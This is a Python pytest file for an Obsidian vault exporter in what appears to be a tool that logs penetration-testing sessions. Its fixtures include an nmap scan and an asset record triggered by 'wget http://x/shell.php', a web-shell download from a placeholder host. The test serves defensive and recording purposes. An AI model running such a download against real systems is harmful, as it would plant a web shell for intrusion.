"""Tests for Obsidian vault exporter (M4)."""
from pathlib import Path

import pytest
from guild_scroll.log_schema import SessionMeta, CommandEvent, NoteEvent, AssetEvent
from guild_scroll.session_loader import LoadedSession
from guild_scroll.exporters.obsidian import export_obsidian


def _make_session(tmp_path, name="htb-test", commands=None, notes=None, assets=None, platform=None):
    meta = SessionMeta(
        session_name=name, session_id="abc123",
        start_time="2026-04-01T10:00:00Z", hostname="kali",
        platform=platform,
    )
    meta.end_time = "2026-04-01T11:00:00Z"
    return LoadedSession(
        meta=meta,
        commands=commands or [],
        assets=assets or [],
        notes=notes or [],
        session_dir=tmp_path,
    )


class TestExportObsidian:
    def test_creates_main_session_file(self, tmp_path):
        session = _make_session(tmp_path)
        out_dir = tmp_path / "vault"
        export_obsidian(session, out_dir)
        assert (out_dir / "Session - htb-test.md").exists()

    def test_yaml_frontmatter_present(self, tmp_path):
        session = _make_session(tmp_path)
        out_dir = tmp_path / "vault"
        export_obsidian(session, out_dir)
        content = (out_dir / "Session - htb-test.md").read_text()
        assert "---" in content
        assert "tags:" in content

    def test_guild_scroll_tag_present(self, tmp_path):
        session = _make_session(tmp_path)
        out_dir = tmp_path / "vault"
        export_obsidian(session, out_dir)
        content = (out_dir / "Session - htb-test.md").read_text()
        assert "guild-scroll" in content

    def test_platform_tag_included(self, tmp_path):
        session = _make_session(tmp_path, platform="htb")
        out_dir = tmp_path / "vault"
        export_obsidian(session, out_dir)
        content = (out_dir / "Session - htb-test.md").read_text()
        assert "htb" in content

    def test_phase_tags_as_hashtags(self, tmp_path):
        cmd = CommandEvent(
            seq=1, command="nmap -sV 10.0.0.1",
            timestamp_start="2026-04-01T10:01:00Z",
            timestamp_end="2026-04-01T10:01:30Z",
            exit_code=0, working_directory="/home/kali",
        )
        session = _make_session(tmp_path, commands=[cmd])
        out_dir = tmp_path / "vault"
        export_obsidian(session, out_dir)
        content = (out_dir / "Session - htb-test.md").read_text()
        assert "#recon" in content

    def test_notes_with_wikilinks(self, tmp_path):
        note = NoteEvent(text="Found open port", timestamp="2026-04-01T10:05:00Z", tags=["recon"])
        session = _make_session(tmp_path, notes=[note])
        out_dir = tmp_path / "vault"
        export_obsidian(session, out_dir)
        content = (out_dir / "Session - htb-test.md").read_text()
        assert "[[" in content

    def test_note_file_created_in_notes_dir(self, tmp_path):
        note = NoteEvent(text="Got credentials", timestamp="2026-04-01T10:10:00Z", tags=["creds"])
        session = _make_session(tmp_path, notes=[note])
        out_dir = tmp_path / "vault"
        export_obsidian(session, out_dir)
        assert (out_dir / "Notes" / "note-01.md").exists()

    def test_assets_section_present(self, tmp_path):
        asset = AssetEvent(
            seq=1, trigger_command="wget http://x/shell.php",
            asset_type="download", captured_path="assets/shell.php",
            original_path="/tmp/shell.php", timestamp="2026-04-01T10:06:00Z",
        )
        session = _make_session(tmp_path, assets=[asset])
        out_dir = tmp_path / "vault"
        export_obsidian(session, out_dir)
        content = (out_dir / "Session - htb-test.md").read_text()
        assert "Assets" in content
        assert "shell.php" in content

    def test_empty_session_does_not_crash(self, tmp_path):
        session = _make_session(tmp_path)
        out_dir = tmp_path / "vault"
        export_obsidian(session, out_dir)  # should not raise
        assert (out_dir / "Session - htb-test.md").exists()

    def test_notes_and_assets_dirs_created(self, tmp_path):
        session = _make_session(tmp_path)
        out_dir = tmp_path / "vault"
        export_obsidian(session, out_dir)
        assert (out_dir / "Notes").is_dir()
        assert (out_dir / "Assets").is_dir()
